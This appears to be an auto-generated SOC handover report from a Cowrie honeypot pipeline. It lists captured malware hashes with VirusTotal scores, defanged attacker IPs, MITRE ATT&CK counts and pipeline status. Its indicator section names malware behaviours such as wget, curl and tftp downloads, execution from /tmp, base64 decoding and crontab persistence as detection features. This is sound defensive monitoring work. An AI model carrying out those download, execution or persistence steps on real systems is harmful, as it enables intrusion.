| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `218.4.156[.]254` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `211.23.109[.]116` | TW | Data Communication Business Group, | **100** ⚠️ | 50 |
| `31.173.8[.]170` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `152.32.212[.]226` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 30 |
| `222.186.68[.]153` | CN | ZHENJIANG YIQUAN HOTEL | **100** ⚠️ | 50 |
| `116.255.215[.]168` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 50 |
| `218.21.246[.]238` | CN | InnerMongoliaWuhaiGanSuErJian | **100** ⚠️ | 50 |
| `101.13.4[.]124` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `72.229.136[.]74` | US | Charter Communications Inc | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 81 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 72 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 9 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 9 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 8 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 3 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
| Tool 34  | Credential Extractor        | ✅ 94 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 72 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (13.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 19 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 72 priority case(s) shown individually · 24 recon entry/entries in table (7 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T18:44:46Z_
